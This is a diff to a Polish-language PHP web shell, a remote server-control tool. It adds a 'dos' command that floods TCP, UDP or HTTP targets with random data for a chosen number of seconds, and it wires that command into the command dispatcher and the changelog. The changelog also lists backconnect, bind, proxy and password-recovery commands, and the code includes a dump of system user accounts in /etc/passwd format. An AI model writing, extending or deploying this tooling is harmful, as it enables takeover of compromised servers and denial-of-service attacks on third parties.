@@ -13,6 +13,7 @@ require_once dirname( __FILE__ ) . '/Lib/Form.php';
 require_once dirname( __FILE__ ) . '/Lib/Html.php';
 require_once dirname( __FILE__ ) . '/Lib/MysqlDumper.php';
 require_once dirname( __FILE__ ) . '/Lib/PasswordRecovery.php';
+require_once dirname( __FILE__ ) . '/Lib/Dos.php';
 
 /**
  * class Shell - Zarzadzanie serwerem ;)
@@ -22,6 +23,7 @@ require_once dirname( __FILE__ ) . '/Lib/PasswordRecovery.php';
  * @todo
  *      Edycja pliku
  *      Wysylanie emaili
+ *      Proxy jako biblioteka
  *
  * @uses       Request
  * @uses       Form
@@ -32,7 +34,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.2 b110601';
+	const VERSION = '0.2 b110602';
 
 	/**
 	 * Czas generowania strony
@@ -184,7 +186,7 @@ CONTENT;
 		 */
 		if( ! $this -> bSafeMode )
 		{
-			ini_set( 'display_errors',         0 );
+			ini_set( 'display_errors',         1 );
 			ini_set( 'max_execution_time',     0 );
 			ini_set( 'memory_limit',           '1024M' );
 			ini_set( 'default_socket_timeout', 5 );
@@ -194,7 +196,7 @@ CONTENT;
 		/**
 		 * Config
 		 */
-		error_reporting( 0 );
+		error_reporting( -1 );
 		ignore_user_abort( 0 );
 		date_default_timezone_set( 'Europe/Warsaw' );
 
@@ -369,8 +371,8 @@ ls - Wyświetlanie informacji o plikach i katalogach
 		ls ścieżka_do_katalogu
 
 	Opcje:
-		-l  wyświetlanie szczegółowych informacji o plikach i katalogach
-		    właściciel, grupa, rozmiar, czas utworzenia
+		-l wyświetlanie szczegółowych informacji o plikach i katalogach
+		   właściciel, grupa, rozmiar, czas utworzenia
 
 		-R wyświetlanie plików i katalogów rekurencyjnie
 
@@ -409,7 +411,7 @@ HELP;
 			/**
 			 * Informacja o komendzie jaka wykonalismy
 			 */
-			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArgv );
+			$sOutput .= sprintf( "%s %s\r\n\r\n", $this -> sCmd, $this -> sArgv );
 
 			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );
 
@@ -422,7 +424,7 @@ HELP;
 					 */
 					if( $this -> bWindows )
 					{
-						$sOutput .= sprintf( "%s %11d %s %s\n",
+						$sOutput .= sprintf( "%s %11d %s %s\r\n",
 							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
 							$oFile -> getSize(), date( 'Y-m-d h:i',
 								$oFile -> getCTime() ),
@@ -431,7 +433,7 @@ HELP;
 					}
 					else
 					{
-						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n",
+						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\r\n",
 							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
 							substr( sprintf( '%o', $oFile -> getPerms() ), -4 ),
 							$this -> getOwnerById( $oFile -> getOwner() ),
@@ -443,7 +445,7 @@ HELP;
 				}
 				else
 				{
-					$sOutput .= sprintf( "%s %s\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
+					$sOutput .= sprintf( "%s %s\r\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
 				}
 			}
 
@@ -451,7 +453,7 @@ HELP;
 		}
 		catch( Exception $oException )
 		{
-			return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
+			return sprintf( "Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s", $sDir, $oException -> getMessage()  );
 		}
 	}
 
@@ -517,11 +519,11 @@ HELP;
 		{
 			if( ! mkdir( $this -> aArgv[ $i ], 0777, TRUE ) )
 			{
-				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\n", $this -> aArgv[ $i ] );
+				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\r\n", $this -> aArgv[ $i ] );
 			}
 			else
 			{
-				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"green\">został utworzony</span>\n", $this -> aArgv[ $i ] );
+				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"green\">został utworzony</span>\r\n", $this -> aArgv[ $i ] );
 			}
 		}
 
@@ -651,7 +653,7 @@ HELP;
 						 */
 						if( ! rmdir( $oFile -> getPathname() ) )
 						{
-							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
+							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\r\n", $oFile -> getPathname() );
 						}
 					}
 					else
@@ -661,7 +663,7 @@ HELP;
 						 */
 						if( ! unlink( $oFile -> getPathname() ) )
 						{
-							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\n", $oFile -> getPathname() );
+							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\r\n", $oFile -> getPathname() );
 						}
 					}
 				}
@@ -678,7 +680,7 @@ HELP;
 			}
 			catch( Exception $oException )
 			{
-				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
+				return sprintf( "Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s", $sDir, $oException -> getMessage()  );
 			}
 
 			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> sArgv );
@@ -1320,7 +1322,7 @@ HELP;
 
 			$sOutput = NULL;
 
-			$sLines = str_repeat( '-', array_sum( $aDataLength ) + 1 + 3 * count( $aDataLength ) ) . "\n";
+			$sLines = str_repeat( '-', array_sum( $aDataLength ) + 1 + 3 * count( $aDataLength ) ) . "\r\n";
 
 			$sOutput .= $sLines;
 			/**
@@ -1330,7 +1332,7 @@ HELP;
 			{
 				$sOutput .= '| ' . str_pad( $sColumn, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
 			}
-			$sOutput .= "|\n" . $sLines;
+			$sOutput .= "|\r\n" . $sLines;
 
 			/**
 			 * Dane
@@ -1341,7 +1343,7 @@ HELP;
 				{
 					$sOutput .= '| ' . str_pad( $sValue, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
 				}
-				$sOutput .= "|\n";
+				$sOutput .= "|\r\n";
 			}
 
 			return htmlspecialchars( $sOutput . $sLines );
@@ -1704,7 +1706,7 @@ HELP;
 				/**
 				 * Wzor jak dla pliku /etc/passwd
 				 */
-				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
+				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\r\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
 			}
 		}
 
@@ -1763,7 +1765,7 @@ HELP;
 		catch( PasswordRecoveryException $oException )
 		{
 			header( 'Content-Type: text/html; charset=utf-8', TRUE );
-			return $oException;
+			return $oException -> getMessage();
 		}
 	}
 
@@ -1856,14 +1858,14 @@ HELP;
 		 */
 		if( ! socket_listen( $rSock ) )
 		{
-			return "Nie można nasłuchiwać\n";
+			return "Nie można nasłuchiwać\r\n";
 		}
 
 		ob_start();
 
 		header( 'Content-Type: text/plain; charset=utf-8', TRUE );
 
-		echo "Proxy zostało uruchomione\n\n";
+		echo "Proxy zostało uruchomione\r\n\r\n";
 
 		for(;;)
 		{
@@ -1898,7 +1900,7 @@ HELP;
 				switch( $sCommand )
 				{
 					case 'exit':
-						echo "Command -> exit\n";
+						echo "Command -> exit\r\n";
 						socket_write( $rClient, "Dobranoc ;)" );
 
 						socket_close( $rClient );
@@ -1909,7 +1911,7 @@ HELP;
 						socket_close( $rSock );
 						exit ;
 					case 'ping':
-						echo "Command -> ping\n";
+						echo "Command -> ping\r\n";
 						socket_close( $rClient );
 						break ;
 				}
@@ -1930,7 +1932,7 @@ HELP;
 			 */
 			if( $aHost[1] === 'command.exit' )
 			{
-				echo "Command -> exit\n";
+				echo "Command -> exit\r\n";
 				socket_write( $rClient, "HTTP/1.1 200 OK\r\n\r\nProxy zakonczylo swoje dzialanie" );
 				socket_close( $rClient );
 				socket_close( $rSock );
@@ -1980,7 +1982,7 @@ HELP;
 			 */
 			if( $bIgnoreImages && in_array( pathinfo( $aGet[1], PATHINFO_EXTENSION ), array( 'jpg', 'gif', 'png', 'ico', 'psd', 'bmp' ) ) )
 			{
-				echo "Ignore Image\n";
+				echo "Ignore Image\r\n";
 				$sImageHeader = "HTTP/1.0 200 OK\r\n" .
 						"Content-Type: image/gif\r\n" .
 						"Accept-Ranges: bytes\r\n" .
@@ -2009,7 +2011,7 @@ HELP;
 				 */
 				if( ! socket_connect( $rHost, $sIp, 80 ) )
 				{
-					echo "Error\n";
+					echo "Error\r\n";
 					continue ;
 				}
 
@@ -2018,7 +2020,7 @@ HELP;
 				 */
 				if( ! socket_write( $rHost, $sHeaders ) )
 				{
-					echo "Error\n";
+					echo "Error\r\n";
 					continue ;
 				}
 
@@ -2051,7 +2053,7 @@ HELP;
 				/**
 				 * Statystyki
 				 */
-				printf( "Data: %7dKB Speed: %7.2fKB/s\n", ceil( $iTotalLen / 1024 ), ( $iTotalLen / ( microtime( 1 ) - $fSpeed ) / 1024 ) );
+				printf( "Data: %7dKB Speed: %7.2fKB/s\r\n", ceil( $iTotalLen / 1024 ), ( $iTotalLen / ( microtime( 1 ) - $fSpeed ) / 1024 ) );
 			}
 
 			/**
@@ -2079,6 +2081,66 @@ HELP;
 	}
 
 	/**
+	 * Komenda - dos
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandDos()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 3 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+dos - Denial Of Service - wysyłanie losowych danych na protokoły tcp, udp i http
+
+	Typ:
+		tcp
+		udp
+		http
+
+	Opcje:
+		-n  wysłanie pakietu a następnie utworzenie nowego połączenia,
+		    przy wysłaniu 100MB mamy utworzonych 100 połączeń, bez tej opcji wszystkie dane
+		    zostaną wysłane przy pomocy jednego połączenia, dla 'http' połączenie będzie
+		    typu 'Keep-Alive' jeżeli jest dostępne
+
+	Użycie:
+		dos http http://localhost/auth/ czas_trwania_ataku_w_sekundach
+		dos typ host:port czas_trwania_ataku_w_sekundach
+
+	Przykład:
+		dos http http://localhost/auth/ 60
+		dos tcp localhost:80 60
+HELP;
+		}
+
+		try
+		{
+			ob_start();
+
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oPasswordRecovery = new Dos();
+			$oPasswordRecovery -> setHost( $this -> aArgv[1] )
+					   -> setType( $this -> aArgv[0] )
+					   -> setTime( $this -> aArgv[2] )
+					   -> setNewConnection( in_array( 'n', $this -> aOptv ) )
+					   -> get();
+			ob_end_flush();
+			exit ;
+
+		}
+		catch( DosException $oException )
+		{
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			$oException -> getMessage();
+		}
+	}
+
+	/**
 	 * Komenda - chmod
 	 *
 	 * @access private
@@ -2096,8 +2158,9 @@ Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href=
 btw, sprawdziłeś komendę: '<strong>:g4m3</strong>'?
 
 Changelog:
+==========
 
-2011-06-01 v0.2
+2011-06-02 v0.2
 ----------
 * Wsparcie dla CLI
 * Shella rozszerzono o następujące komendy:
@@ -2111,6 +2174,7 @@ Changelog:
 	<strong>backconnect</strong>
 	<strong>bind</strong>
 	<strong>proxy</strong>
+	<strong>dos</strong>
 	<strong>passwordrecovery</strong>
 	<strong>cr3d1ts</strong>
 * polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
@@ -2197,18 +2261,18 @@ HELP;
 
 			if( ( $iNum = mt_rand( 0, 9 ) ) === $iDigit )
 			{
-				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
+				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\r\n", $iDigit, $iNum );
 				++$iWins;
 			}
 			else
 			{
-				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
+				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\r\n", $iDigit, $iNum );
 				++$iLoses;
 			}
 		}
 		while( ++$i < $iLoop );
 
-		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\n\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
+		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\r\n\r\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
 	}
 
 	/**
@@ -2240,8 +2304,8 @@ HELP;
 			$sClass = $oClass -> getName();
 			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) && ( $sClass !== 'getCommandCr3d1ts' ) && ( $sClass !== 'getCommandG4m3' ) )
 			{
-				$sInfo = $this -> {$sClass}() . "\n\n\n\n";
-				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\n" ) );
+				$sInfo = $this -> {$sClass}() . "\r\n\r\n\r\n\r\n";
+				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\r\n" ) );
 				$sOutput .= $sInfo;
 
 			}
@@ -2272,7 +2336,7 @@ HELP;
 			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommandsPos[ $iKey ] ), $aCommandsPos[ $iKey ], 0 );
 		}
 
-		return substr( implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput, 0, -3 );
+		return substr( implode( "\r\n", $aCommandsInfo ) . "\r\n\r\n\r\n\r\n" . $sOutput, 0, -6 );
 	}
 
 	/**
@@ -2454,6 +2518,9 @@ HELP;
 					break ;
 				case 'proxy':
 					$sConsole = $this -> getCommandProxy();
+					break ;
+				case 'dos':
+					$sConsole = $this -> getCommandDos();
 					break ;
 				case 'passwordrecovery':
 				case 'pr':
